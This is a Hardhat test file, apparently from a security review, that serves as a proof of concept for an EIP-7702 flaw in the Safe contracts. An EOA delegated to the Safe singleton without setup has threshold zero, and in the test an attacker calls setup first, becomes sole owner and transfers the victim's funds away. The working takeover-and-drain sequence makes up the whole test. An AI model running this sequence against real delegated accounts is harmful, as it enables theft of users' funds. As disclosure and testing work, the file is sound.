import { expect } from "chai";
import hre from "hardhat";
import { AddressZero } from "@ethersproject/constants";
import { getSafeSingleton, getEip7702SafeTemplateWithSingleton } from "../../../test/utils/setup";
import { executeTxWithSigners, buildSafeTransaction } from "../../../src/utils/execution";

// Security review PoC (run with: npx hardhat test docs/security-review/poc/eip7702-setup-frontrun.spec.ts).
// An EOA that delegates to the Safe singleton (EIP-7702) without calling `setup` in the same transaction
// has `threshold == 0`, so anyone can call `setup` and become the sole owner of the EOA.
describe("Security review PoC: EIP-7702 delegated EOA setup front-run [@skip-on-coverage]", () => {
    it("attacker can take over a freshly delegated EOA and drain it", async () => {
        await hre.deployments.fixture();
        const [victim, attacker, receiver] = await hre.ethers.getSigners();
        const singleton = await getSafeSingleton();

        // Victim delegates to the Safe singleton but has not called setup yet.
        const delegated = await getEip7702SafeTemplateWithSingleton(singleton, victim);
        expect(await delegated.getThreshold()).to.eq(0n);

        const victimBalanceBefore = await hre.ethers.provider.getBalance(victim.address);
        expect(victimBalanceBefore).to.be.gt(0n);

        // Attacker front-runs the victim's setup call.
        const asAttacker = delegated.connect(attacker);
        await asAttacker.setup([attacker.address], 1, AddressZero, "0x", AddressZero, AddressZero, 0, AddressZero);
        expect(await delegated.isOwner(attacker.address)).to.eq(true);
        expect(await delegated.isOwner(victim.address)).to.eq(false);

        // Attacker now controls the EOA's funds through execTransaction.
        const amount = victimBalanceBefore / 2n;
        const receiverBefore = await hre.ethers.provider.getBalance(receiver.address);
        const tx = buildSafeTransaction({ to: receiver.address, value: amount, nonce: await delegated.nonce() });
        await executeTxWithSigners(asAttacker, tx, [attacker]);
        const receiverAfter = await hre.ethers.provider.getBalance(receiver.address);
        expect(receiverAfter - receiverBefore).to.eq(amount);
    });
});
